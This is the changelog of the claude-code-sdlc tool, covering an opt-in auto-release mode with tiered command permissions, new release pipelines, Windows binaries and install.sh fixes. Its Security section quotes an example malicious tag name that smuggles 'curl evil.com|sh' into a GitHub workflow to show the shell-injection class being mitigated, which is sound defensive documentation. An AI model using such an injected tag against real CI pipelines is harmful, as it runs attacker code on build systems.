# Changelog

All notable user-facing changes to claude-code-sdlc are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

User-facing means changes a developer using the SDLC pipeline notices in
their day-to-day work — new commands, new agents, new gates, behavioral
changes to existing pipeline stages, install.sh changes, fixes to broken
flows. Internal refactors, type-only changes, test-infrastructure tweaks,
and documentation cleanups do NOT belong here (per
`templates/rules/changelog.md`).

## [Unreleased]

### Added

- **Auto-release executing mode** (opt-in via `.claude/rules/auto-release.md`).
  When the sentinel file is present, `release-engineer` Gate 9 transitions
  from suggest-only to executing mode after Steps 0–6 produce the structured
  summary. Gate 9 then creates and pushes the release tag itself with a
  4-tier authority dispatch — Trivial (`git add`, `commit`, `merge-base`,
  `diff`, `ls-remote`) auto-execute silently; Moderate (`git tag -a`)
  auto-execute with audit; Sensitive (`git push origin <tag>`) prompt
  default-deny `[y/N]` with `AUTO_RELEASE=1` env var or non-TTY stdin
  auto-confirm; Forbidden (`npm publish`, `cargo publish`, `pypi upload`,
  `gh release create`, any `--force`) refused unconditionally. Anchored-
  regex bash whitelist with metacharacter pre-rejection. Sentinel-absent
  behavior is byte-identical to suggest-only mode.
- **Tag-scheme disambiguation** in Gate 9. Releases that touch
  `tools/sdlc-knowledge/` get the `sdlc-knowledge-v<X.Y.Z>` tag scheme
  (triggers the binary release pipeline); pure SDLC core releases get
  the bare `v<X.Y.Z>` scheme (triggers the new core release pipeline);
  both-changed releases prompt for explicit user choice (auto-aborts in
  headless mode).
- **Windows-x64 prebuilt binary** for `sdlc-knowledge`. The release matrix
  now produces a Windows binary alongside darwin-arm64, darwin-x64,
  linux-x64, and linux-arm64. `install.sh` detects MINGW2/MSYS/CYGWIN
  shell environments and downloads the Windows binary (with `.exe`
  suffix) instead of attempting a cargo source build. (Note: Windows
  binary build is matrix-defined but pdf.rs unix-only imports may
  prevent compilation — gated behind `cfg(unix)` in iter-3.1.)
- **SDLC core release pipeline** (`.github/workflows/sdlc-core-release.yml`).
  Bare `v*.*.*` tag pushes now produce a GitHub Release with source
  tarball + release-notes body (consumed from `.claude/release-notes-X.Y.Z.md`)
  via `softprops/action-gh-release@v2`. Disjoint from the existing
  `sdlc-knowledge-v*` pipeline.
- **Source tarball generation** for both release pipelines. `git archive`
  honors the new `.gitattributes` `export-ignore` entries so internal
  artifacts (`.claude/` agent state, `docs/qa/`, `docs/use-cases/`,
  `books/` corpus) are stripped from published source distributions.
  Defense-in-depth `tar -tzf | grep` step in the core pipeline fails the
  job if any excluded path leaks into the archive.
- **Pre-push hook template** (`templates/hooks/pre-push`). Optional
  advisory hook for opted-in projects that warns to stderr when
  `CHANGELOG.md [Unreleased]` is non-empty at push time, suggesting
  `/merge-ready` Gate 9 should run first. Never blocks the push.
  Honors `GIT_HOOKS_BYPASS=1` for one-shot bypass.
- **SDLC core opts in to its own pipeline.** Adds
  `.claude/rules/auto-release.md` (Gate 9 executing-mode sentinel) and
  `.claude/rules/changelog.md` (changelog-writer activation) at the
  repo root. The previous `no-op: not configured` outcome from
  `changelog-writer` lifecycle hooks is now active — the SDLC repo
  dogfoods its own automated changelog and release packaging.

### Changed

- **install.sh major version bump 2.1.0 → 3.0.0.** Reflects the breaking
  change in `release-engineer` Gate 9 semantics: opted-in projects now
  see Gate 9 transition from suggest-only to executing mode. Suggest-only
  remains the default; the bump signals the new executing-mode option.
- **install.sh REPO_URL** corrected from `github.com/Koroqe/claude-code-sdlc.git`
  to `github.com/codefather-labs/claude-code-sdlc.git`. Restores the
  one-line install via `curl -fsSL https://raw.githubusercontent.com/codefather-labs/claude-code-sdlc/main/install.sh | bash`,
  which had been broken by the typo against the actual canonical remote.
- **`sdlc-knowledge` release pipeline** extended with grouped find
  alternation (`\( -name 'libpdfium*' -o -name 'pdfium*' \) -type f`)
  so Windows pdfium archives (which name the library `pdfium.dll`
  without the `lib` prefix per Windows convention) are matched
  alongside the macOS/Linux `libpdfium.{dylib,so}` form.

### Security

- **install.sh download hardening parity.** The `install_knowledge_binary`
  function's curl invocation gains `--max-redirs 5 --max-time 120` and
  the wget fallback gains `--max-redirect=5 --timeout=120 --secure-protocol=TLSv1_2`
  to match the pdfium-download path's defense-in-depth. Mitigates
  redirect-loop denial-of-service and infinite-stall scenarios on
  attacker-controlled or dead URLs (Slice 2 security pre-review MEDIUM).
- **Workflow shell-injection prevention** in `sdlc-core-release.yml`.
  All `${{ github.ref_name }}` and `${{ github.event.* }}` references
  are mediated through `env:` blocks before being consumed by `run:`
  shell commands; never directly interpolated. Mitigates the named
  exploit class where a malicious tag name embeds shell substitution
  (e.g., `v1.0.0$(curl evil.com|sh)`) and executes during the workflow
  run (Slice 4 security pre-review HIGH M5c + A1).
